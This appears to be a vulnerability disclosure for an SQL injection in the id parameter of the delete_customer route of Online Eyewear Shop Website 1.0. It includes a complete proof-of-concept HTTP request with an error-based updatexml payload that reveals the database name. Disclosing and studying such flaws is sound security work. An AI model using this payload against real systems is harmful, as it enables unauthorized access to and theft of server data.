## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Users.php?f=delete_customer

## Description:
The online eyewear store website 1.0 has a SQL injection attack in the id parameter in the route /oews/classes/Users.php?f=delete_customer. 
Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Users.php?f=delete_customer HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p65p1sp36htfqevfnhij1jvtie
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

id=1 and updatexml(1,concat(0x7e,(database())),3)-- q
```

Get the database name directly through the error report: oews_db

![CleanShot 2025-04-03 at 11 25 40@2x](https://github.com/user-attachments/assets/5446d8bd-c07a-4a21-a41f-d31cdab6a5d7)


## Code Analysis
The id parameter is controllable and directly introduced into the SQL statement, causing a SQL injection vulnerability.
![CleanShot 2025-04-03 at 11 26 09@2x](https://github.com/user-attachments/assets/c5d3de8e-37a9-44cf-acd8-f61e1c70b1b5)


